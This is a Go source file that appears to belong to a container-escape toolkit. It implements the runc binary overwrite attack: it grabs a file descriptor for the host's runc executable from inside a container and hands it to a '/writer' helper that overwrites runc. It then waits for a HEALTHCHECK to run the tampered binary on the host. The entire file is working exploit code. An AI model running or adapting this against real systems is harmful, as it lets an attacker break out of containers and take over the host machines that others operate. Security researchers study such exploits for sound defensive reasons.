//go:build ignore
// +build ignore

package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"

	"ctrsploit-escape-image/runcwatch"
)

const (
	writerRuncFD      = 3
	postOverwriteWait = 5 * time.Second
)

func main() {
	handle, err := runcwatch.CaptureHandle(0, runcwatch.OpenProcExeFD)
	if err != nil {
		fmt.Fprintf(os.Stderr, "capture runc fd: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Found the runc PID %d\n", handle.PID)
	fmt.Printf("[+] Found the runc cmdline %q\n", handle.Cmdline)
	fmt.Printf("[+] Found the runc exe %s\n", handle.Exe)
	fmt.Printf("[+] Successfully got runc file handle %d\n", handle.FD)

	if err := runWriter(handle.FD); err != nil {
		fmt.Fprintf(os.Stderr, "run writer: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Waiting %s for HEALTHCHECK to execute overwritten runc\n", postOverwriteWait)
	time.Sleep(postOverwriteWait)
}

func runWriter(fd int) error {
	if fd < 0 {
		return fmt.Errorf("invalid runc fd %d", fd)
	}
	runc := os.NewFile(uintptr(fd), "runc")
	if runc == nil {
		return fmt.Errorf("wrap runc fd %d", fd)
	}
	defer runc.Close()

	cmd := exec.Command("/writer", fmt.Sprintf("/proc/self/fd/%d", writerRuncFD))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.ExtraFiles = []*os.File{runc}
	return cmd.Run()
}
